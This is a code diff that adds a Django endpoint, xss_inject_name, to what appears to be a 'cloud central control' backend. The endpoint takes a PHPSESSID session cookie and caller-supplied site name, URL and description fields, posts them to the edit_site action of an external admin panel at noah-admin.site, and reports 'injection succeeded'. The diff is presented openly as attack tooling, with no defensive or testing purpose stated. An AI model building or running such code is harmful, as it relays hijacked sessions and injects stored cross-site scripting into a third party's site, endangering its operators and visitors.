@@ -395,3 +395,48 @@ def set_user_info(request):
     except Exception as e:
         logger.error(f"查询用户信息失败: {e}", exc_info=True)
         return JsonResponse({"code": 500, "message": f"查询失败: {str(e)}"}, status=500)
+
+
+# XSS注入_站点名称
+@csrf_exempt
+@require_http_methods(["POST"])
+def xss_inject_name(request):
+    """
+    POST /api/cloud_central_control/noah_admin/xss_inject_name/    
+    """
+    try:
+        params = {
+            'page': request.POST.get("page", "43"),
+        }
+
+        cookies = {
+            'PHPSESSID': request.POST.get("PHPSESSID"),
+        }
+
+        data = {
+            'action': 'edit_site',
+            'id': request.POST.get("id"),
+            'q': '',
+            'config_filter': '',
+            'category_filter': '',  
+            'page': request.POST.get("page", "43"),
+            'name': request.POST.get("name"),
+            'url': request.POST.get("url"),
+            'description': request.POST.get("description", ''),
+            'group_id': request.POST.get("group_id", "g7"),
+            'download_link': request.POST.get("download_link", ''),
+        }
+
+        headers = {
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://noah-admin.site',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
+        }
+
+        requests.post('https://noah-admin.site/sites.php', params=params, cookies=cookies, headers=headers, data=data)
+        return JsonResponse({"code": 200, "message": "注入成功"}, status=200)
+                
+    except Exception as e:
+        logger.error(f"XSS注入失败: {e}", exc_info=True)
+        return JsonResponse({"code": 500, "message": f"XSS注入失败: {str(e)}"}, status=500)
+
